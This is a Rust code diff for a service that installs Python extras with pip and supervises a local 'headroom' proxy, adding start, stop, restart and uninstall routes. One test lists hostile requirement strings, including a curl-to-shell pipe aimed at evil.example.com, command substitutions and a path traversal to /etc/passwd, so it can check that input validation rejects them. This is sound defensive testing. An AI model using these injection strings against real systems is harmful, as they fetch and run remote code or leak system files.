@@ -27,6 +27,8 @@ use std::{
     time::{Duration, Instant},
 };
 
+mod control;
+
 use actix_web::{HttpResponse, http::StatusCode, web};
 use serde::{Deserialize, Serialize};
 use serde_json::Value;
@@ -35,7 +37,6 @@ use crate::{json_body, responses};
 
 /// URL reported by `status`, unchanged from before this module grew.
 const HEADROOM_URL: &str = "http://127.0.0.1:8787";
-const HEADROOM_UNSUPPORTED: &str = "Headroom process control is not supported by nullrouter-api";
 
 /// Extras that improve compression quality, mirroring upstream's
 /// `HEADROOM_COMPRESSION_EXTRAS`. `proxy` is the base and is not listed here.
@@ -56,6 +57,12 @@ const HEADROOM_DIST: &str = "headroom-ai";
 
 /// `headroom-ai` requires this or newer.
 const MIN_PYTHON: (u32, u32) = (3, 10);
+
+/// Names the interpreter to use, overriding the search.
+///
+/// The way out of a PEP 668 refusal: a virtualenv named here can be installed into, where the
+/// distribution's own Python cannot.
+const PYTHON_OVERRIDE_VAR: &str = "NULLROUTER_PYTHON";
 const MIN_PYTHON_LABEL: &str = "3.10";
 
 /// Budgets for the two kinds of probe. `pip` reads its own metadata tree, so it
@@ -252,6 +259,16 @@ fn python_candidates() -> Vec<PathBuf> {
         }
         candidates.push(candidate);
     };
+
+    // An explicit choice wins, and is the answer to a PEP 668 interpreter: point this at a
+    // virtualenv and installing works without fighting the system package manager. It is still
+    // version-checked and permission-checked like any other candidate.
+    if let Some(configured) = std::env::var_os(PYTHON_OVERRIDE_VAR) {
+        let path = PathBuf::from(configured);
+        if !path.as_os_str().is_empty() {
+            push(path, false);
+        }
+    }
 
     if let Some(dir) = find_headroom_binary().as_deref().and_then(Path::parent) {
         for name in ["python3", "python3.13", "python"] {
@@ -519,6 +536,34 @@ fn install_log_tail() -> (String, Option<PathBuf>) {
 
 // ── headroom URL ────────────────────────────────────────────────────────────
 
+/// Whether `--code-aware` is on.
+///
+/// Upstream reads `settings.headroomCodeAware === true`, so anything other than a stored `true`
+/// means off. This port's settings projection carries no such field, so the env var stands in,
+/// with the same default: off unless explicitly turned on.
+fn configured_code_aware() -> bool {
+    env_flag("HEADROOM_CODE_AWARE").unwrap_or(false)
+}
+
+/// Whether kompress is on.
+///
+/// Upstream reads `settings.headroomKompress !== false`, so the default is **on** and only a
+/// stored `false` disables it. Getting this backwards would silently turn compression off for
+/// every deployment that never set it.
+fn configured_kompress() -> bool {
+    env_flag("HEADROOM_KOMPRESS").unwrap_or(true)
+}
+
+/// Read a boolean environment variable, or `None` when it is unset or unreadable.
+fn env_flag(name: &str) -> Option<bool> {
+    let value = std::env::var(name).ok()?;
+    match value.trim().to_ascii_lowercase().as_str() {
+        "1" | "true" | "yes" | "on" => Some(true),
+        "0" | "false" | "no" | "off" => Some(false),
+        _ => None,
+    }
+}
+
 /// The configured proxy URL.
 ///
 /// Upstream reads `settings.headroomUrl` and falls back to
@@ -630,6 +675,27 @@ fn requested_extras(body: Option<&Value>) -> (Vec<String>, Vec<String>) {
 ///
 /// `proxy` is always present because it is the base the proxy command lives in.
 /// Built from the already-filtered list, so it is a closed set of literals.
+/// The distribution names one or more extras pull in.
+///
+/// Read from the same marker table `installed_extras` uses to decide whether an extra is present,
+/// so removing exactly reverses what installing added. A name that is not a known extra
+/// contributes nothing: it was already filtered by `requested_extras`, and this is the second
+/// place that would have to fail for a request name to reach `pip`.
+fn marker_packages(accepted: &[String]) -> Vec<String> {
+    let mut packages: Vec<String> = accepted
+        .iter()
+        .filter_map(|extra| {
+            EXTRA_MARKERS
+                .iter()
+                .find(|(name, _markers)| *name == extra.as_str())
+        })
+        .flat_map(|(_name, markers)| markers.iter().map(|marker| (*marker).to_owned()))
+        .collect();
+    packages.sort_unstable();
+    packages.dedup();
+    packages
+}
+
 fn install_spec(accepted: &[String]) -> String {
     let mut extras: Vec<&str> = vec!["proxy"];
     extras.extend(accepted.iter().map(String::as_str));
@@ -638,19 +704,32 @@ fn install_spec(accepted: &[String]) -> String {
 
 // ── response shapes ─────────────────────────────────────────────────────────
 
-const INSTALL_UNSUPPORTED: &str =
-    "Installing headroom extras is not supported by nullrouter-api. Nothing was installed.";
-const RESTART_UNSUPPORTED: &str =
-    "Restarting the headroom proxy is not supported by nullrouter-api. Nothing was restarted.";
 const EXTERNAL_PROXY: &str = "External Headroom proxies must be started outside 9Router";
 
-#[derive(Debug, Clone, Copy, Serialize)]
+/// What `installMessage` says now that installing works.
+const INSTALL_SUPPORTED: &str =
+    "Installing extras runs pip against the interpreter reported in `python`, with a 15 minute \
+     deadline. The `ml` extra pulls large packages.";
+
+/// What `restartMessage` says now that restarting works.
+const RESTART_SUPPORTED: &str =
+    "Start, stop and restart supervise the headroom proxy and report the pid this service owns.";
+
+#[derive(Debug, Clone, Serialize)]
 #[serde(rename_all = "camelCase")]
 struct HeadroomStatus {
     running: bool,
     healthy: bool,
     url: &'static str,
+    /// The pid this service owns, when it owns one.
     managed_pid: Option<u32>,
+    /// Supervisor state: `stopped`, `starting`, `running`, `backoff`, `failed`.
+    state: &'static str,
+    /// Restarts since the last manual start, so a flapping proxy is visible.
+    restarts: u32,
+    /// Why the last attempt ended badly.
+    #[serde(skip_serializing_if = "Option::is_none")]
+    last_error: Option<String>,
     message: &'static str,
 }
 
@@ -660,13 +739,6 @@ struct ProxyUnsupported {
     success: bool,
     unsupported: bool,
     path: String,
-    message: &'static str,
-}
-
-#[derive(Debug, Clone, Copy, Serialize)]
-struct UnsupportedMutation {
-    success: bool,
-    unsupported: bool,
     message: &'static str,
 }
 
@@ -707,10 +779,13 @@ impl From<Detection> for ExtrasReport {
                 .map(|path| path.display().to_string()),
             python_version: detection.python_version,
             python_min_version: MIN_PYTHON_LABEL,
-            install_supported: false,
-            install_message: INSTALL_UNSUPPORTED,
-            restart_supported: false,
-            restart_message: RESTART_UNSUPPORTED,
+            // Both are true now. Left as fields rather than removed: a panel built against the
+            // earlier build branches on them, and flipping the value is what tells it the
+            // buttons work.
+            install_supported: true,
+            install_message: INSTALL_SUPPORTED,
+            restart_supported: true,
+            restart_message: RESTART_SUPPORTED,
         }
     }
 }
@@ -727,33 +802,74 @@ struct LogTail {
 }
 
 /// `POST /api/headroom/extras`, always a refusal in this build.
+/// A finished `pip` run.
 #[derive(Debug, Serialize)]
 #[serde(rename_all = "camelCase")]
-struct InstallRefused {
+struct InstallResult {
     success: bool,
-    unsupported: bool,
-    code: &'static str,
-    error: &'static str,
+    /// The requirement that was installed, or the packages removed.
+    spec: String,
     /// Extras this build recognises, out of what was asked for.
     requested: Vec<String>,
     /// Names that are not in [`HEADROOM_COMPRESSION_EXTRAS`].
     ignored: Vec<String>,
     available: [&'static str; 2],
-    /// The pip requirement that was *not* installed, so the user can run it
-    /// against the interpreter `GET /api/headroom/extras` reported.
-    spec: String,
+    /// The tail of what `pip` printed, so the panel can show what happened.
+    output: String,
+    /// What is installed now, re-detected rather than assumed.
+    #[serde(skip_serializing_if = "Option::is_none")]
+    extras: Option<ExtrasReport>,
 }
 
-/// `POST /api/headroom/restart`, always a refusal in this build.
+/// A `pip` run that did not succeed.
 #[derive(Debug, Serialize)]
 #[serde(rename_all = "camelCase")]
-struct RestartRefused {
+struct InstallFailed {
     success: bool,
-    unsupported: bool,
+    /// Machine-readable cause: `NOT_INSTALLED`, `NO_PYTHON`, `EXTERNALLY_MANAGED`, `PIP_FAILED`.
     code: &'static str,
-    error: &'static str,
+    error: String,
+    /// The requirement that was attempted, so the operator can run it themselves.
+    spec: String,
+    requested: Vec<String>,
+    ignored: Vec<String>,
+    available: [&'static str; 2],
+}
+
+/// The outcome of a start, stop or restart.
+#[derive(Debug, Serialize)]
+#[serde(rename_all = "camelCase")]
+struct ProcessResult {
+    success: bool,
+    running: bool,
+    /// Supervisor state, so a panel can distinguish `starting` from `running`.
+    state: &'static str,
+    /// The pid this service owns. Upstream reports one read back from a file, which can
+    /// describe a pid the kernel has since reused.
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pid: Option<u32>,
     url: String,
-    port: u16,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    port: Option<u16>,
+    message: String,
+    /// Recent daemon output, which is where a startup problem explains itself.
+    #[serde(skip_serializing_if = "Vec::is_empty")]
+    logs: Vec<String>,
+}
+
+/// A start or restart that did not succeed.
+#[derive(Debug, Serialize)]
+#[serde(rename_all = "camelCase")]
+struct ProcessFailed {
+    success: bool,
+    code: &'static str,
+    error: String,
+    url: String,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    port: Option<u16>,
+    state: &'static str,
+    #[serde(skip_serializing_if = "Vec::is_empty")]
+    logs: Vec<String>,
 }
 
 /// `POST /api/headroom/restart` for a proxy this machine does not host.
@@ -784,6 +900,7 @@ pub(super) fn configure(config: &mut web::ServiceConfig) {
             web::resource("/api/headroom/extras")
                 .route(web::get().to(extras))
                 .route(web::post().to(install_extras))
+                .route(web::delete().to(uninstall_extras))
                 .route(web::method(actix_web::http::Method::OPTIONS).to(no_content)),
         )
         .service(
@@ -791,8 +908,8 @@ pub(super) fn configure(config: &mut web::ServiceConfig) {
                 .route(web::post().to(restart))
                 .route(web::method(actix_web::http::Method::OPTIONS).to(no_content)),
         )
-        .service(web::resource("/api/headroom/start").route(web::post().to(unsupported_mutation)))
-        .service(web::resource("/api/headroom/stop").route(web::post().to(unsupported_mutation)))
+        .service(web::resource("/api/headroom/start").route(web::post().to(start)))
+        .service(web::resource("/api/headroom/stop").route(web::post().to(stop)))
         .service(web::resource("/api/headroom/proxy/{tail:.*}").route(web::to(proxy)));
 }
 
@@ -800,15 +917,28 @@ async fn no_content() -> HttpResponse {
     responses::empty(StatusCode::NO_CONTENT)
 }
 
+/// `GET /api/headroom/status`.
+///
+/// `running` and `managedPid` now come from the supervisor rather than being fixed. `healthy` is
+/// still separate from `running`, and deliberately so: the process existing is not the same claim
+/// as the proxy answering, and collapsing them would report a wedged daemon as healthy.
 async fn status() -> HttpResponse {
+    let snapshot = control::snapshot();
     responses::json(
         StatusCode::OK,
         &HeadroomStatus {
-            running: false,
-            healthy: false,
+            running: snapshot.pid.is_some(),
+            healthy: snapshot.is_running(),
             url: HEADROOM_URL,
-            managed_pid: None,
-            message: HEADROOM_UNSUPPORTED,
+            managed_pid: snapshot.pid,
+            state: snapshot.state.as_str(),
+            restarts: snapshot.restarts,
+            last_error: snapshot.last_error,
+            message: if snapshot.pid.is_some() {
+                "headroom proxy is supervised by this service"
+            } else {
+                "no headroom proxy is running under this service"
+            },
         },
     )
 }
@@ -851,14 +981,16 @@ async fn extras(query: web::Query<ExtrasQuery>) -> HttpResponse {
     }
 }
 
-/// Refuse to install extras, and say exactly what was not installed.
+/// `POST /api/headroom/extras` — install the requested extras with `pip`.
 ///
-/// This service does not own the interpreter it discovers. Installing into it
-/// would mean an unbounded `pip` download (the `ml` extra pulls `torch`) into an
-/// environment that may be externally managed (PEP 668), from a request with no
-/// supervision, no progress channel, and no way to cancel. So nothing is
-/// installed and nothing claims to be: `success` is `false` and the requirement
-/// string is handed back for the user to run themselves.
+/// The requirement is built by [`install_spec`] from [`HEADROOM_COMPRESSION_EXTRAS`], so the
+/// request chooses *which of two known extras* to include and nothing else: names outside that
+/// list are reported in `ignored` rather than passed to `pip`. Combined with the requirement
+/// charset in `nullrouter-procctl`, there is no request that reaches `pip` as a flag, a URL, or a
+/// second package.
+///
+/// `pip` gets a deadline, which upstream does not give it — the `ml` extra pulls `torch`, and a
+/// stalled index otherwise leaves the install waiting indefinitely with nothing to cancel.
 async fn install_extras(body: web::Bytes) -> HttpResponse {
     // A malformed body is rejected before anything else: a caller who sent
     // broken JSON must not receive a considered answer about their extras.
@@ -867,67 +999,204 @@ async fn install_extras(body: web::Bytes) -> HttpResponse {
         Err(response) => return response,
     };
     let (requested, ignored) = requested_extras(parsed.as_ref());
+    let spec = install_spec(&requested);
 
-    responses::json(
-        StatusCode::NOT_IMPLEMENTED,
-        &InstallRefused {
-            success: false,
-            unsupported: true,
-            code: "UNSUPPORTED",
-            error: INSTALL_UNSUPPORTED,
-            spec: install_spec(&requested),
-            requested,
-            ignored,
-            available: HEADROOM_COMPRESSION_EXTRAS,
-        },
-    )
+    match control::pip_install(&spec).await {
+        Ok(output) => {
+            // Re-detect rather than assume: `pip` can report success having resolved to an
+            // already-satisfied requirement, and what the panel needs is what is now installed.
+            let extras = actix_web::rt::task::spawn_blocking(detect)
+                .await
+                .map(ExtrasReport::from)
+                .ok();
+            responses::json(
+                StatusCode::OK,
+                &InstallResult {
+                    success: true,
+                    spec,
+                    requested,
+                    ignored,
+                    available: HEADROOM_COMPRESSION_EXTRAS,
+                    output: control::tail_of(&output),
+                    extras,
+                },
+            )
+        }
+        Err(error) => responses::json(
+            error.status(),
+            &InstallFailed {
+                success: false,
+                code: control::code_for(&error),
+                error: error.to_string(),
+                spec,
+                requested,
+                ignored,
+                available: HEADROOM_COMPRESSION_EXTRAS,
+            },
+        ),
+    }
 }
 
-/// Refuse to restart the proxy, after checking the URL upstream would check.
+/// `DELETE /api/headroom/extras` — remove the marker packages an extra pulled in.
 ///
-/// The loopback check runs first and keeps its upstream meaning: a proxy on
-/// another host is not this machine's to restart, and that is a `400` here as it
-/// is upstream. A local URL then gets a `501`, because restarting means killing
-/// a pid this service never recorded and re-spawning a detached daemon it has no
-/// supervisor for. Reporting success would tell a user compression came back up
-/// when no process was touched.
-async fn restart() -> HttpResponse {
-    let url = configured_headroom_url();
-    if !is_loopback_headroom_url(&url) {
+/// Upstream exposes `uninstallHeadroomExtras`, and without it an operator who installed `ml` by
+/// mistake has a multi-gigabyte dependency and no way to undo it from the panel.
+async fn uninstall_extras(body: web::Bytes) -> HttpResponse {
+    let parsed = match json_body::parse_optional::<Value>(&body) {
+        Ok(parsed) => parsed,
+        Err(response) => return response,
+    };
+    let (requested, ignored) = requested_extras(parsed.as_ref());
+
+    // The packages come from this repository's own marker table, keyed by an extra name that had
+    // to be in the closed list to get here. A request name never becomes a package name.
+    let packages = marker_packages(&requested);
+    if packages.is_empty() {
         return responses::json(
             StatusCode::BAD_REQUEST,
-            &ExternalProxyRefused {
+            &InstallFailed {
                 success: false,
-                error: EXTERNAL_PROXY,
-                code: "EXTERNAL_PROXY",
-                url,
+                code: "NO_EXTRAS",
+                error: "name at least one of the available extras to remove".to_owned(),
+                spec: String::new(),
+                requested,
+                ignored,
+                available: HEADROOM_COMPRESSION_EXTRAS,
             },
         );
     }
 
-    let port = url_port(&url).unwrap_or(DEFAULT_HEADROOM_PORT);
+    match control::pip_uninstall(&packages).await {
+        Ok(output) => responses::json(
+            StatusCode::OK,
+            &InstallResult {
+                success: true,
+                spec: packages.join(" "),
+                requested,
+                ignored,
+                available: HEADROOM_COMPRESSION_EXTRAS,
+                output: control::tail_of(&output),
+                extras: actix_web::rt::task::spawn_blocking(detect)
+                    .await
+                    .map(ExtrasReport::from)
+                    .ok(),
+            },
+        ),
+        Err(error) => responses::json(
+            error.status(),
+            &InstallFailed {
+                success: false,
+                code: control::code_for(&error),
+                error: error.to_string(),
+                spec: packages.join(" "),
+                requested,
+                ignored,
+                available: HEADROOM_COMPRESSION_EXTRAS,
+            },
+        ),
+    }
+}
+
+/// `POST /api/headroom/start` — bring the proxy up.
+async fn start() -> HttpResponse {
+    let url = configured_headroom_url();
+    match loopback_port(&url) {
+        Err(response) => response,
+        Ok(port) => run_start(port, url).await,
+    }
+}
+
+/// `POST /api/headroom/restart` — stop then start.
+///
+/// Sequenced rather than issued as one command because the supervisor's own replacement is what
+/// makes it atomic: a start stops whatever is running first, so this exists to report the stop
+/// separately, which is what the panel shows while it waits.
+async fn restart() -> HttpResponse {
+    let url = configured_headroom_url();
+    let port = match loopback_port(&url) {
+        Err(response) => return response,
+        Ok(port) => port,
+    };
+    let stopped = control::stop().await;
+    tracing::info!(?stopped, "headroom proxy stopped for restart");
+    run_start(port, url).await
+}
+
+/// `POST /api/headroom/stop` — take the proxy down. Idempotent.
+async fn stop() -> HttpResponse {
+    let outcome = control::stop().await;
     responses::json(
-        StatusCode::NOT_IMPLEMENTED,
-        &RestartRefused {
-            success: false,
-            unsupported: true,
-            code: "UNSUPPORTED",
-            error: RESTART_UNSUPPORTED,
-            url,
-            port,
+        StatusCode::OK,
+        &ProcessResult {
+            success: true,
+            running: false,
+            state: "stopped",
+            pid: None,
+            url: configured_headroom_url(),
+            port: None,
+            message: format!("headroom proxy stopped ({outcome:?})"),
+            logs: Vec::new(),
         },
     )
 }
 
-async fn unsupported_mutation() -> HttpResponse {
-    responses::json(
-        StatusCode::NOT_IMPLEMENTED,
-        &UnsupportedMutation {
+/// The port to run on, or the refusal for a proxy that is not this machine's.
+///
+/// The loopback check keeps its upstream meaning and its upstream status: a proxy on another host
+/// is not ours to start, stop or restart, and that is a `400` there and here.
+fn loopback_port(url: &str) -> Result<u16, HttpResponse> {
+    if is_loopback_headroom_url(url) {
+        return Ok(url_port(url).unwrap_or(DEFAULT_HEADROOM_PORT));
+    }
+    Err(responses::json(
+        StatusCode::BAD_REQUEST,
+        &ExternalProxyRefused {
             success: false,
-            unsupported: true,
-            message: HEADROOM_UNSUPPORTED,
+            error: EXTERNAL_PROXY,
+            code: "EXTERNAL_PROXY",
+            url: url.to_owned(),
         },
-    )
+    ))
+}
+
+/// Start the daemon and render the outcome.
+async fn run_start(port: u16, url: String) -> HttpResponse {
+    let options = control::DaemonOptions {
+        port,
+        code_aware: configured_code_aware(),
+        kompress: configured_kompress(),
+    };
+
+    match control::start(options).await {
+        Ok(snapshot) => responses::json(
+            StatusCode::OK,
+            &ProcessResult {
+                success: true,
+                running: snapshot.is_running(),
+                state: snapshot.state.as_str(),
+                pid: snapshot.pid,
+                url,
+                port: Some(port),
+                message: format!("headroom proxy is listening on port {port}"),
+                logs: snapshot.logs,
+            },
+        ),
+        Err(error) => {
+            let snapshot = control::snapshot();
+            responses::json(
+                error.status(),
+                &ProcessFailed {
+                    success: false,
+                    code: control::code_for(&error),
+                    error: error.to_string(),
+                    url,
+                    port: Some(port),
+                    state: snapshot.state.as_str(),
+                    logs: snapshot.logs,
+                },
+            )
+        }
+    }
 }
 
 async fn proxy(path: web::Path<String>) -> HttpResponse {
@@ -944,6 +1213,48 @@ async fn proxy(path: web::Path<String>) -> HttpResponse {
 
 #[cfg(test)]
 mod tests {
+    /// The second layer, checked on its own.
+    ///
+    /// `requested_extras` filters names against `HEADROOM_COMPRESSION_EXTRAS` before
+    /// `install_spec` sees them, so in practice nothing hostile reaches the requirement. That
+    /// makes the charset in `nullrouter-procctl` unexercised by the route — and an unexercised
+    /// guard is one that can rot without anything failing. This asserts it directly: if the
+    /// filter were ever bypassed, the requirement would still be refused rather than executed.
+    #[test]
+    fn a_requirement_built_from_an_unfiltered_name_is_refused_by_the_charset() {
+        use nullrouter_procctl::argv::Argv;
+
+        for hostile in [
+            "ml];curl evil.example.com|sh;[",
+            "ml --index-url=https://evil.example.com",
+            "ml`id`",
+            "ml$(id)",
+            "../../etc/passwd",
+        ] {
+            // Deliberately skipping `requested_extras`, which is the layer being bypassed.
+            let spec = super::install_spec(&[hostile.to_owned()]);
+
+            assert!(
+                Argv::new().requirement("requirement", &spec).is_err(),
+                "{spec:?} would have been passed to pip"
+            );
+        }
+
+        // And the requirements this module really builds are all accepted, so the guard is not
+        // simply refusing everything.
+        for accepted in [
+            vec![],
+            vec!["code".to_owned()],
+            vec!["code".to_owned(), "ml".to_owned()],
+        ] {
+            let spec = super::install_spec(&accepted);
+            assert!(
+                Argv::new().requirement("requirement", &spec).is_ok(),
+                "{spec:?} was refused"
+            );
+        }
+    }
+
     use super::{
         install_spec, is_loopback_headroom_url, normalise_dist, parse_python_version,
         requested_extras, url_host, url_port, version_is_supported,
